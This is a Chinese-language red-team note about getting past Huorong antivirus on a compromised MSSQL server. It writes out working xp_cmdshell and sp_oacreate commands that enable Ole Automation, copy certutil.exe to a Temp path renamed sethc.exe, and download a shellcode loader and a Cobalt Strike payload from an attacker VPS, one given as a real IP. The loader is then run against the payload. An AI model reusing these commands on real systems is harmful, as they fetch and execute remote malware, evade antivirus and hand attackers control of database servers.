local_port = 4444
remote_port = 2333

![E3B51E067B2366D67635BC9838C3B0C2](../../../../Library/Containers/com.tencent.qq/Data/Library/Caches/Images/E3B51E067B2366D67635BC9838C3B0C2.jpg)

我理解这是两类防御，第一种是木马查杀，也就是beacon类型，没做免杀或者免杀力度不够上来就没了。第二类是加载器+内存注入，不过此类会被入侵检测检测到。

上网查了一下，火绒应该只针对前者还有本地的异常命令进行检测，所以可以利用`certutil`从vps上远程下载loader和row文件。

```
Exec master.dbo.xp_cmdshell ' certutil –urlcache –f –split http://your ip/HanzoInjection.exe C:\Windows\Temp\loader.exe'
```

![image-20220326114039661](../../../../Library/Application Support/typora-user-images/image-20220326114039661.png)

![image-20220326113519456](../../../../Library/Application Support/typora-user-images/image-20220326113519456.png)

发现vps收到了访问请求，但是并没能下载成功，查了一下是火绒对本地`certutil`有所限制，可以 把system32下的`certutil`移位置重命名绕过。

```
exec sp_configure 'show advanced options', 1;  RECONFIGURE;  exec sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;


利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为sethc.exe：
declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\certutil.exe' ,'c:\windows\temp\sethc.exe';

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://175.24.190.208:20022/HanzoInjection.exe" C:\Users\MSSQLSERVER\loader.exe'

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://your ip/cs.bin" C:\Users\MSSQLSERVER\cs.bin'

Exec master.dbo.xp_cmdshell 'cd C:\Users\MSSQLSERVER\ && loader.exe -e cs.bin'

```
